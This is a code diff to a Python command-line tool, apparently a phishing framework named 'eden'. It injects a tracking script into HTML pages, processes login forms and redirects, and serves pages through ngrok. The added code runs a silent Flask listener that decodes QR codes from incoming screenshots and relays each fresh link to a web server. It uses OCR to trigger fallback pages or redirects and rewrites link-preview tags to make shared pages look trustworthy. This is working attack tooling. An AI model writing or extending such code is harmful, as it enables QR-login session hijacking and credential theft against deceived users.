@@ -318,7 +318,7 @@ def show_loading_bar(message, total_steps=20, delay=0.1):
     for i in range(total_steps + 1):
         percent = i / total_steps
         filled_width = int(bar_width * percent)
-        bar = '█' * filled_width + '░' * (bar_width - filled_width)
+        bar = '█' * filled_width + ' ' * (bar_width - filled_width)
         sys.stdout.write(f'\r{message} [{bar}] {int(percent * 100)}%')
         sys.stdout.flush()
         time.sleep(delay)
@@ -338,7 +338,12 @@ def install_required_modules():
         'colorama': 'colorama',
         'tqdm': 'tqdm',
         'bs4': 'beautifulsoup4',
-        'websocket': 'websocket-client'
+        'websocket': 'websocket-client',
+        'PIL': 'Pillow',
+        'pyzbar': 'pyzbar',
+        'pytesseract': 'pytesseract',
+        'flask': 'flask',
+        'flask_cors': 'flask-cors'
     }
     
     # Check which modules are missing
@@ -451,6 +456,73 @@ client_id_to_nickname_map = {}
 stop_monitoring = False
 custom_output_dir = None
 custom_download_dir = None
+
+# OCR and QR Global State
+ocr_words = set()
+ocr_lines = []
+ocr_last_updated = None
+current_qr_link = None
+keyword_memory = {
+    "keyword": None,
+    "status": "GREY"
+}
+
+# Link Preview runtime config (OG tags)
+LINK_PREVIEW_CONFIG = {
+    "title": "",
+    "description": "",
+    "image": ""
+}
+
+LINK_PREVIEW_FILES = set()
+
+
+def inject_link_preview_meta(filename):
+    """Inject Open Graph meta tags into an HTML file based on LINK_PREVIEW_CONFIG."""
+    if not os.path.exists(filename):
+        print(f"{Fore.RED}✗ Preview file not found: {filename}")
+        return
+
+    try:
+        with open(filename, "r", encoding="utf-8") as f:
+            html = f.read()
+
+        # Remove existing OG/meta-author tags to avoid duplicates
+        html = re.sub(
+            r'<meta[^>]*(og:title|og:description|og:image|og:type)[^>]*>',
+            '',
+            html,
+            flags=re.I
+        )
+        html = re.sub(
+            r'<meta[^>]*name="author"[^>]*>',
+            '',
+            html,
+            flags=re.I
+        )
+
+        # Build fresh OG block
+        og_tags = f'<meta property="og:title" content="{LINK_PREVIEW_CONFIG["title"]}">\n' \
+                  f'<meta property="og:description" content="{LINK_PREVIEW_CONFIG["description"]}">\n' \
+                  f'<meta property="og:image" content="{LINK_PREVIEW_CONFIG["image"]}">\n' \
+                  f'<meta property="og:type" content="website">'
+
+        # Inject right after <head>
+        # First, ensure we don't leave double newlines by cleaning up the match area
+        html = re.sub(r"<head>\s*", "<head>\n" + og_tags + "\n", html, 1, flags=re.I)
+
+        with open(filename, "w", encoding="utf-8") as f:
+            f.write(html)
+
+        print(f"{Fore.GREEN}✓ Injected link preview metadata → {filename}")
+    except Exception as e:
+        print(f"{Fore.RED}✗ Failed to update preview metadata for {filename}: {e}")
+
+
+def auto_update_link_previews():
+    """Re-apply link preview metadata to all linked files."""
+    for fpath in LINK_PREVIEW_FILES:
+        inject_link_preview_meta(fpath)
 
 def get_downloads_dir():
     """Get the downloads directory, respecting custom setting if available"""
@@ -806,6 +878,555 @@ def stop_eden_output_monitor():
     """Stop the eden output monitoring thread"""
     global stop_monitoring
     stop_monitoring = True
+
+# QR Listener functionality
+def start_qr_listener():
+    """Start the QR code listener in background thread"""
+    global qr_listener_thread, qr_listener_running
+    
+    if qr_listener_running:
+        return
+    
+    try:
+        from flask import Flask, request, jsonify
+        from flask_cors import CORS
+        from PIL import Image
+        from io import BytesIO
+        from pyzbar.pyzbar import decode
+        import base64
+        import datetime
+        import urllib.request
+        import json
+        import re
+        try:
+            import pytesseract
+            # Configure Tesseract path
+            tesseract_path = r'C:\Users\Indian\AppData\Local\Programs\Tesseract-OCR\tesseract.exe'
+            if os.path.exists(tesseract_path):
+                pytesseract.pytesseract.tesseract_cmd = tesseract_path
+            OCR_AVAILABLE = True
+        except ImportError:
+            OCR_AVAILABLE = False
+            pytesseract = None
+        app = Flask(__name__)
+        CORS(app) # Enable CORS for all routes
+        app.config['JSONIFY_PRETTYPRINT_REGULAR'] = False
+        
+        # Suppress Flask logging to run silently in background
+        import logging
+        log = logging.getLogger('werkzeug')
+        log.setLevel(logging.ERROR)
+        log.disabled = True
+        
+        
+        current_qr_link_local = None
+        last_update_time_local = None
+        
+        @app.route("/api/current-qr", methods=["GET"])
+        def get_current_qr():
+            """API endpoint to get current QR link"""
+            global current_qr_link
+            return jsonify({
+                "link": current_qr_link,
+                "timestamp": last_update_time_local if 'last_update_time_local' in locals() else None
+            })
+        
+        @app.route("/api/ocr/words", methods=["GET"])
+        def get_ocr_words():
+            """API endpoint to get OCR word list - live updates from global state"""
+            global ocr_words, ocr_last_updated
+            return jsonify({
+                "success": True,
+                "words": sorted(list(ocr_words)),
+                "last_updated": ocr_last_updated.isoformat() if ocr_last_updated else None
+            })
+        
+        
+        # EdenQR config file path (stores selected HTML file and redirect URL)
+        EDENQR_CONFIG_PATH = os.path.join(os.getcwd(), "edenqr_config.json")
+        
+        def load_edenqr_config():
+            """Load edenqr_config.json or return default"""
+            try:
+                if os.path.exists(EDENQR_CONFIG_PATH):
+                    with open(EDENQR_CONFIG_PATH, 'r', encoding='utf-8') as f:
+                        data = json.load(f)
+                        return data
+            except Exception as e:
+                print(f"Error loading edenqr_config.json: {e}")
+            return {
+                "selected_html_file": None,
+                "selected_html_content": None,
+                "redirect_url": None
+            }
+        
+        def save_edenqr_config(data):
+            """Save edenqr_config.json"""
+            try:
+                with open(EDENQR_CONFIG_PATH, 'w', encoding='utf-8') as f:
+                    json.dump(data, f, indent=2, ensure_ascii=False)
+            except Exception as e:
+                print(f"Error saving edenqr_config.json: {e}")
+        
+        def trigger_fallback():
+            """Trigger fallback when keyword status is RED - startup.py decides"""
+            try:
+                config = load_edenqr_config()
+                selected_html_file = config.get("selected_html_file")
+                selected_html_content = config.get("selected_html_content")
+                redirect_url = config.get("redirect_url")
+                
+                # Priority 1: HTML file
+                if selected_html_file and selected_html_content:
+                    # Send HTML to WebSocket server (server.js) via HTTP
+                    try:
+                        import urllib.request
+                        import urllib.parse
+                        fallback_data = {
+                            "type": "render-html",
+                            "html": selected_html_content
+                        }
+                        data = json.dumps(fallback_data).encode('utf-8')
+                        req = urllib.request.Request(
+                            'http://localhost:8080/api/fallback',
+                            data=data,
+                            headers={'Content-Type': 'application/json'}
+                        )
+                        urllib.request.urlopen(req, timeout=2)
+                        print(f"✓ Fallback triggered: HTML file '{selected_html_file}'")
+                    except Exception as e:
+                        print(f"✗ Failed to trigger HTML fallback: {e}")
+                    return
+                
+                # Priority 2: Redirect URL
+                if redirect_url and redirect_url.strip():
+                    try:
+                        import urllib.request
+                        import urllib.parse
+                        fallback_data = {
+                            "type": "redirect-url",
+                            "url": redirect_url.strip()
+                        }
+                        data = json.dumps(fallback_data).encode('utf-8')
+                        req = urllib.request.Request(
+                            'http://localhost:8080/api/fallback',
+                            data=data,
+                            headers={'Content-Type': 'application/json'}
+                        )
+                        urllib.request.urlopen(req, timeout=2)
+                        print(f"✓ Fallback triggered: Redirect to '{redirect_url}'")
+                    except Exception as e:
+                        print(f"✗ Failed to trigger redirect fallback: {e}")
+            except Exception as e:
+                print(f"✗ Error triggering fallback: {e}")
+        
+        def check_keyword_against_ocr(keyword):
+            """Check keyword against current OCR words - returns status"""
+            global keyword_memory, ocr_words, ocr_lines
+            
+            if not keyword or keyword.strip() == "":
+                return "GREY"
+            
+            keyword_lower = keyword.lower()
+            # Check in words (global state)
+            exists_in_words = keyword_lower in ocr_words
+            # Check in full lines (case-insensitive, global state)
+            exists_in_lines = any(keyword_lower in line.lower() for line in ocr_lines)
+            
+            if exists_in_words or exists_in_lines:
+                return "GREEN"
+            else:
+                return "RED"
+        
+        def update_keyword_status():
+            """Update keyword status based on current OCR words and trigger fallback if RED"""
+            global keyword_memory
+            keyword = keyword_memory["keyword"]
+            previous_status = keyword_memory.get("status", "GREY")
+            
+            if not keyword:
+                keyword_memory["status"] = "GREY"
+            else:
+                keyword_memory["status"] = check_keyword_against_ocr(keyword)
+            
+            # CRITICAL: If status becomes RED, trigger fallback immediately
+            if keyword_memory["status"] == "RED" and previous_status != "RED" and keyword:
+                trigger_fallback()
+            
+            return keyword_memory["status"]
+        
+        @app.route("/api/keyword/save", methods=["POST"])
+        def save_keyword():
+            """Save keyword in memory and return status immediately"""
+            global keyword_memory, ocr_words
+            
+            try:
+                data = request.get_json()
+                keyword = data.get("keyword", "").strip()
+                
+                # Store keyword in memory (lowercase for consistency)
+                keyword_memory["keyword"] = keyword.lower() if keyword else None
+                
+                # Immediately check against current OCR words
+                status = check_keyword_against_ocr(keyword_memory["keyword"])
+                keyword_memory["status"] = status
+                
+                # If status is RED, trigger fallback immediately
+                if status == "RED" and keyword:
+                    trigger_fallback()
+                
+                # ALWAYS return this exact format - no other format allowed
+                return jsonify({
+                    "success": True,
+                    "status": status
+                })
+            except Exception as e:
+                # Even on error, return the required format
+                return jsonify({
+                    "success": True,
+                    "status": "GREY"
+                })
+        
+        @app.route("/api/keyword/check", methods=["GET"])
+        def check_keyword_status():
+            """Check current keyword against live OCR words - for continuous polling"""
+            global keyword_memory, ocr_words
+            
+            try:
+                keyword = keyword_memory.get("keyword")
+                
+                if not keyword:
+                    status = "GREY"
+                else:
+                    # Check against current OCR words (live)
+                    status = check_keyword_against_ocr(keyword)
+                    previous_status = keyword_memory.get("status", "GREY")
+                    
+                    # Update memory
+                    keyword_memory["status"] = status
+                    
+                    # If status becomes RED, trigger fallback immediately
+                    if status == "RED" and previous_status != "RED":
+                        trigger_fallback()
+                
+                # Return status for UI indicator
+                return jsonify({
+                    "success": True,
+                    "status": status,
+                    "keyword": keyword
+                })
+            except Exception as e:
+                return jsonify({
+                    "success": True,
+                    "status": "GREY",
+                    "keyword": None
+                })
+        
+        @app.route("/api/edenqr/config", methods=["GET", "POST"])
+        def edenqr_config():
+            """Get or set EdenQR config (selected HTML file and redirect URL)"""
+            try:
+                if request.method == "GET":
+                    config = load_edenqr_config()
+                    return jsonify({
+                        "success": True,
+                        "selected_html_file": config.get("selected_html_file"),
+                        "redirect_url": config.get("redirect_url")
+                    })
+                else:  # POST
+                    data = request.get_json()
+                    config = load_edenqr_config()
+                    
+                    # Update selected HTML file
+                    if "selected_html_file" in data:
+                        config["selected_html_file"] = data.get("selected_html_file")
+                    if "selected_html_content" in data:
+                        config["selected_html_content"] = data.get("selected_html_content")
+                    
+                    # Update redirect URL
+                    if "redirect_url" in data:
+                        config["redirect_url"] = data.get("redirect_url")
+                    
+                    save_edenqr_config(config)
+                    return jsonify({
+                        "success": True,
+                        "message": "Config updated"
+                    })
+            except Exception as e:
+                return jsonify({
+                    "success": False,
+                    "error": str(e)
+                }), 500
+        
+        # HTML Upload APIs
+        @app.route("/api/html/upload", methods=["POST"])
+        def upload_html():
+            """Upload HTML file - store in memory and config"""
+            try:
+                data = request.get_json()
+                filename = data.get("filename")
+                content = data.get("content")
+                
+                if not filename or not content:
+                    return jsonify({"success": False, "error": "Missing filename or content"}), 400
+                
+                # Store in config
+                config = load_edenqr_config()
+                if "uploaded_files" not in config:
+                    config["uploaded_files"] = {}
+                
+                config["uploaded_files"][filename] = {
+                    "filename": filename,
+                    "content": content,
+                    "uploaded_at": datetime.datetime.now().isoformat()
+                }
+                
+                save_edenqr_config(config)
+                return jsonify({"success": True, "message": "File uploaded"})
+            except Exception as e:
+                return jsonify({"success": False, "error": str(e)}), 500
+        
+        @app.route("/api/html/list", methods=["GET"])
+        def list_html_files():
+            """List all uploaded HTML files"""
+            try:
+                config = load_edenqr_config()
+                files = config.get("uploaded_files", {})
+                file_list = [{"filename": f["filename"], "uploaded_at": f.get("uploaded_at")} 
+                            for f in files.values()]
+                return jsonify({"success": True, "files": file_list})
+            except Exception as e:
+                return jsonify({"success": False, "error": str(e)}), 500
+        
+        @app.route("/api/html/select", methods=["POST"])
+        def select_html_file():
+            """Select an HTML file as active fallback"""
+            try:
+                data = request.get_json()
+                filename = data.get("filename")
+                
+                config = load_edenqr_config()
+                uploaded_files = config.get("uploaded_files", {})
+                
+                if filename and filename in uploaded_files:
+                    config["selected_html_file"] = filename
+                    config["selected_html_content"] = uploaded_files[filename]["content"]
+                elif filename is None:
+                    # Deselect
+                    config["selected_html_file"] = None
+                    config["selected_html_content"] = None
+                else:
+                    return jsonify({"success": False, "error": "File not found"}), 404
+                
+                save_edenqr_config(config)
+                return jsonify({"success": True, "message": "File selected"})
+            except Exception as e:
+                return jsonify({"success": False, "error": str(e)}), 500
+        
+        @app.route("/api/html/delete", methods=["POST"])
+        def delete_html_file():
+            """Delete an uploaded HTML file"""
+            try:
+                data = request.get_json()
+                filename = data.get("filename")
+                
+                if not filename:
+                    return jsonify({"success": False, "error": "Missing filename"}), 400
+                
+                config = load_edenqr_config()
+                uploaded_files = config.get("uploaded_files", {})
+                
+                if filename not in uploaded_files:
+                    return jsonify({"success": False, "error": "File not found"}), 404
+                
+                # Remove from uploaded files
+                del uploaded_files[filename]
+                config["uploaded_files"] = uploaded_files
+                
+                # If this was the selected file, deselect it
+                if config.get("selected_html_file") == filename:
+                    config["selected_html_file"] = None
+                    config["selected_html_content"] = None
+                
+                save_edenqr_config(config)
+                return jsonify({"success": True, "message": "File deleted"})
+            except Exception as e:
+                return jsonify({"success": False, "error": str(e)}), 500
+        
+        @app.route("/receive_screenshot", methods=["POST"])
+        def receive_screenshot():
+            nonlocal current_qr_link_local, last_update_time_local
+            
+            try:
+                data = request.get_json()
+                image_data = data.get("image")
+                
+                if not image_data:
+                    return jsonify({"error": "no image"}), 400
+                
+                # Decode base64 image
+                if "," in image_data:
+                    img_bytes = base64.b64decode(image_data.split(",")[1])
+                else:
+                    img_bytes = base64.b64decode(image_data)
+                img = Image.open(BytesIO(img_bytes))
+                
+                # Convert to grayscale for better QR detection
+                if img.mode != 'L':
+                    img_gray = img.convert('L')
+                else:
+                    img_gray = img
+                
+                # Resize if too large (for faster processing)
+                width, height = img_gray.size
+                if width > 2000 or height > 2000:
+                    scale = min(2000 / width, 2000 / height)
+                    new_width = int(width * scale)
+                    new_height = int(height * scale)
+                    img_gray = img_gray.resize((new_width, new_height), Image.Resampling.LANCZOS)
+                
+                # OCR Processing - Extract words and lines
+                # Update GLOBAL OCR state (clear previous, save new)
+                global ocr_words, ocr_lines, ocr_last_updated
+                if OCR_AVAILABLE and pytesseract:
+                    try:
+                        # Run OCR on the image (use RGB for better accuracy)
+                        if img.mode != 'RGB':
+                            img_rgb = img.convert('RGB')
+                        else:
+                            img_rgb = img
+                        ocr_text = pytesseract.image_to_string(img_rgb)
+                        
+                        # CLEAR previous OCR data (no merge - only latest screenshot matters)
+                        # Extract all lines
+                        ocr_lines = [line.strip() for line in ocr_text.split('\n') if line.strip()]
+                        
+                        # Extract all words (3+ characters, alphanumeric)
+                        all_words = re.findall(r'[a-zA-Z0-9]{3,}', ocr_text)
+                        # Create new set with lowercase versions
+                        ocr_words = set(word.lower() for word in all_words)
+                        # Also extract words from lines (for partial matches)
+                        for line in ocr_lines:
+                            line_words = re.findall(r'[a-zA-Z0-9]{3,}', line)
+                            ocr_words.update(word.lower() for word in line_words)
+                        
+                        # Update timestamp
+                        ocr_last_updated = datetime.datetime.now()
+                        
+                        # After OCR, check keyword status immediately (if keyword exists)
+                        global keyword_memory
+                        if keyword_memory.get("keyword"):
+                            update_keyword_status()
+                    except Exception as e:
+                        # Log error but continue
+                        print(f"OCR error: {e}")
+                        pass
+                else:
+                    # If OCR not available, clear state
+                    ocr_words = set()
+                    ocr_lines = []
+                    ocr_last_updated = None
+                
+                # QR Detection
+                result = decode(img_gray)
+                
+                # Process QR codes
+                decoded_links = []
+                link_changed = False
+                if result and len(result) > 0:
+                    decoded_links = list(set([r.data.decode('utf-8') for r in result]))
+                
+                num_qrs = len(decoded_links)
+                if num_qrs == 1:
+                    decoded_link = decoded_links[0]
+                    # Check if link changed (only update if different)
+                    if decoded_link != current_qr_link_local:
+                        current_qr_link_local = decoded_link
+                        last_update_time_local = datetime.datetime.now().isoformat()
+                        link_changed = True
+                        
+                        # Update global variable
+                        global current_qr_link
+                        current_qr_link = decoded_link
+                        
+                        # Send to Node.js server with retry logic for immediate update
+                        max_retries = 5
+                        retry_count = 0
+                        while retry_count < max_retries:
+                            try:
+                                qr_data = {
+                                    "type": "qr-link-update",
+                                    "link": decoded_link,
+                                    "timestamp": last_update_time_local
+                                }
+                                req = urllib.request.Request(
+                                    "http://127.0.0.1:8080/api/qr-update",
+                                    data=json.dumps(qr_data).encode('utf-8'),
+                                    headers={'Content-Type': 'application/json'}
+                                )
+                                urllib.request.urlopen(req, timeout=2)
+                                # Immediate update sent successfully
+                                break  # Success, exit retry loop
+                            except Exception as e:
+                                retry_count += 1
+                                if retry_count < max_retries:
+                                    time.sleep(0.5)  # Wait before retry
+                                else:
+                                    pass  # Silent failure - no terminal output
+                
+                # Return response
+                return jsonify({
+                    "success": True,
+                    "qrs_found": num_qrs,
+                    "link": decoded_links[0] if num_qrs == 1 else None,
+                    "changed": link_changed
+                })
+                    
+            except Exception as e:
+                return jsonify({
+                    "success": False,
+                    "error": str(e)
+                }), 500
+        
+        def run_listener():
+            global qr_listener_running
+            qr_listener_running = True
+            try:
+                # Use threaded mode and port 5001 to avoid conflicts
+                app.run(port=5000, host='127.0.0.1', debug=False, use_reloader=False, threaded=True)
+            except Exception as e:
+                if HAS_COLORAMA:
+                    print(f"{Fore.RED}QR Listener error: {e}")
+                else:
+                    print(f"QR Listener error: {e}")
+            finally:
+                qr_listener_running = False
+        
+        qr_listener_thread = threading.Thread(target=run_listener, daemon=True)
+        qr_listener_thread.start()
+        time.sleep(1)  # Give it a moment to start
+        if HAS_COLORAMA:
+            print(f"{Fore.GREEN}✓ QR Listener started on port 5001")
+        else:
+            print(f"✓ QR Listener started on port 5001")
+        
+    except ImportError as e:
+        if HAS_COLORAMA:
+            print(f"{Fore.YELLOW}⚠ QR Listener dependencies not available: {e}")
+            print(f"{Fore.YELLOW}⚠ Install: pip install flask pillow pyzbar pytesseract")
+        else:
+            print(f"⚠ QR Listener dependencies not available: {e}")
+            print(f"⚠ Install: pip install flask pillow pyzbar pytesseract")
+    except Exception as e:
+        if HAS_COLORAMA:
+            print(f"{Fore.RED}✗ Failed to start QR Listener: {e}")
+        else:
+            print(f"✗ Failed to start QR Listener: {e}")
+
+def stop_qr_listener():
+    """Stop the QR listener thread"""
+    global qr_listener_running
+    qr_listener_running = False
 
 def check_nodejs():
     """Check if Node.js is installed and install if needed."""
@@ -1202,6 +1823,7 @@ import signal
 from tqdm import tqdm
 import webbrowser
 from datetime import datetime
+import datetime
 from pathlib import Path
 import glob
 import fnmatch
@@ -1218,6 +1840,17 @@ ngrok_url = None
 server_mode = None  # Local or Ngrok
 connected_count = 0
 terminal_width = 100
+
+
+# QR Listener variables
+qr_listener_thread = None
+qr_listener_running = False
+current_qr_link = None
+
+# Global OCR state (persists across requests)
+ocr_words = set()  # All extracted words (lowercase)
+ocr_lines = []  # All extracted lines
+ocr_last_updated = None  # Timestamp of last OCR update
 
 # Global constants for HTML Modifier
 LOAD_FILE_FUNCTION = """
@@ -2099,6 +2732,10 @@ def show_help():
         ("restart", "Restart the server"),
         ("output <path>", "Set custom location for the EDEN_OUTPUT folder"),
         ("loaddir <path>", "Set custom location to monitor for downloads"),
+        ("title <text>", "Set link preview title for HTML previews"),
+        ("desc <text>", "Set link preview description for HTML previews"),
+        ("image <url>", "Set link preview image URL for HTML previews"),
+        ("preview <file>", "Link an HTML file for automatic preview meta updates"),
         ("link <file>", "Add eden.js script to an HTML file"),
         ("redirect <file>", "Process redirect elements in HTML files"),
         ("login <file>", "Process login forms in HTML files"),
@@ -2128,6 +2765,26 @@ def show_syntax(command=None):
         print(f"{Fore.WHITE}  Example: {Fore.GREEN}loaddir /home/user/Downloads")
         print(f"{Fore.WHITE}  Example: {Fore.GREEN}loaddir C:\\Users\\Username\\Desktop")
         print(f"{Fore.WHITE}  Supports absolute paths, relative paths, and paths with ~ for home directory")
+        return
+    elif command == "title":
+        print(f"\n{Fore.CYAN}title <text>")
+        print(f"{Fore.WHITE}  Set the Open Graph title used for linked preview HTML files.")
+        print(f"{Fore.WHITE}  Example: {Fore.GREEN}title My Product Landing Page")
+        return
+    elif command == "desc":
+        print(f"\n{Fore.CYAN}desc <text>")
+        print(f"{Fore.WHITE}  Set the Open Graph description used for linked preview HTML files.")
+        print(f"{Fore.WHITE}  Example: {Fore.GREEN}desc Fast, secure dynamic execution network")
+        return
+    elif command == "image":
+        print(f"\n{Fore.CYAN}image <url>")
+        print(f"{Fore.WHITE}  Set the Open Graph image URL used for linked preview HTML files.")
+        print(f"{Fore.WHITE}  Example: {Fore.GREEN}image https://example.com/preview.jpg")
+        return
+    elif command == "preview":
+        print(f"\n{Fore.CYAN}preview <file>")
+        print(f"{Fore.WHITE}  Link an HTML file so it receives link preview meta tags (OG title/description/image).")
+        print(f"{Fore.WHITE}  Example: {Fore.GREEN}preview index.html")
         return
     elif command:
         # Show syntax for other commands
@@ -2793,31 +3450,39 @@ def link_script_to_html(filename):
         else:
             script_tag = '<script src="http://localhost:8080/eden.js"></script>'
             
-        # Check if any version of the script tag is already present
-        if 'eden.js"></script>' in content:
-            print(f"{Fore.YELLOW}The script tag is already present in '{filename}'.")
-            return True
+        # Check if we need to update existing eden.js script tags
+        # Improved regex to handle various attributes, spacing, and quotes
+        eden_pattern = r'<script[^>]*src=["\'][^"\']*\/eden\.js["\'][^>]*>\s*<\/script>'
         
-        # Find the closing body tag
-        body_closing_pos = content.lower().rfind('</body>')
+        # Use case-insensitive search
+        existing_match = re.search(eden_pattern, content, re.IGNORECASE)
         
-        # Check if we need to remove existing eden.js script tags
-        eden_pattern = r'<script\s+src=["\'](https?:\/\/[^"\']+\/eden\.js)["\']><\/script>'
-        content = re.sub(eden_pattern, '', content)
-        
-        if body_closing_pos == -1:
-            print(f"{Fore.YELLOW}Warning: No closing </body> tag found in '{filename}'.")
-            print(f"{Fore.YELLOW}Adding script tag at the end of the file.")
-            new_content = content + f"\n{script_tag}\n"
+        if existing_match:
+            # Check if it's already the same tag (normalized for comparison)
+            if script_tag in content:
+                print(f"{Fore.YELLOW}The correct script tag is already present in '{filename}'.")
+                return True
+            
+            # Update the existing tag(s)
+            print(f"{Fore.CYAN}Updating existing eden.js link in '{filename}'...")
+            new_content = re.sub(eden_pattern, script_tag, content, flags=re.IGNORECASE)
         else:
-            # Insert the script tag before the closing body tag
-            new_content = content[:body_closing_pos] + f"\n{script_tag}\n" + content[body_closing_pos:]
+            # No existing tag, find the closing body tag
+            body_closing_pos = content.lower().rfind('</body>')
+            
+            if body_closing_pos == -1:
+                print(f"{Fore.YELLOW}Warning: No closing </body> tag found in '{filename}'.")
+                print(f"{Fore.YELLOW}Adding script tag at the end of the file.")
+                new_content = content + f"\n{script_tag}\n"
+            else:
+                # Insert the script tag before the closing body tag
+                new_content = content[:body_closing_pos] + f"\n{script_tag}\n" + content[body_closing_pos:]
         
         # Write the modified content back to the file
         with open(file_path, 'w', encoding='utf-8') as file:
             file.write(new_content)
         
-        print(f"{Fore.GREEN}✓ Successfully added eden.js script to '{filename}'.")
+        print(f"{Fore.GREEN}✓ Successfully hooked/updated eden.js script in '{filename}'.")
         return True
     
     except Exception as e:
@@ -3040,7 +3705,8 @@ def setup_server():
 def main_menu():
     while True:
         try:
-            command = input(f"\n{Fore.BLUE}eden& {Fore.WHITE}").strip().lower()
+            raw_command = input(f"\n{Fore.BLUE}eden& {Fore.WHITE}").strip()
+            command = raw_command.lower()
             
             if command == "clear":
                 print_banner()
@@ -3055,6 +3721,38 @@ def main_menu():
                     else:
                         print(f"{Fore.RED}Failed to stop server.")
                 setup_server()
+            elif command.startswith("title "):
+                value = raw_command[len("title "):].strip()
+                if not value:
+                    print(f"{Fore.RED}Error: No title provided.")
+                else:
+                    LINK_PREVIEW_CONFIG["title"] = value
+                    print(f"{Fore.GREEN}✓ Updated preview title")
+                    auto_update_link_previews()
+            elif command.startswith("desc "):
+                value = raw_command[len("desc "):].strip()
+                if not value:
+                    print(f"{Fore.RED}Error: No description provided.")
+                else:
+                    LINK_PREVIEW_CONFIG["description"] = value
+                    print(f"{Fore.GREEN}✓ Updated preview description")
+                    auto_update_link_previews()
+            elif command.startswith("image "):
+                value = raw_command[len("image "):].strip()
+                if not value:
+                    print(f"{Fore.RED}Error: No image URL provided.")
+                else:
+                    LINK_PREVIEW_CONFIG["image"] = value
+                    print(f"{Fore.GREEN}✓ Updated preview image URL")
+                    auto_update_link_previews()
+            elif command.startswith("preview "):
+                filename = raw_command[len("preview "):].strip()
+                if not filename:
+                    print(f"{Fore.RED}Error: No HTML file provided for preview.")
+                else:
+                    LINK_PREVIEW_FILES.add(filename)
+                    inject_link_preview_meta(filename)
+                    print(f"{Fore.GREEN}✓ Preview auto-update enabled for {filename}")
             elif command.startswith("output "):
                 # Set custom output directory for EDEN_OUTPUT folder
                 path = command[7:].strip()
@@ -3144,15 +3842,20 @@ def main_menu():
 def main():
     # Register the server shutdown function to run on exit with silent mode
     atexit.register(lambda: shutdown_server(silent=True))
+    atexit.register(lambda: stop_qr_listener())
     
     # Start monitoring eden outputs
     start_eden_output_monitor()
+    
+    # Start QR listener
+    start_qr_listener()
     
     try:
         setup_server()
     except KeyboardInterrupt:
         print(f"\n{Fore.RED}Exiting...")
         stop_eden_output_monitor()  # Stop monitoring thread
+        stop_qr_listener()  # Stop QR listener
         shutdown_server(silent=True)
         sys.exit(0)
 
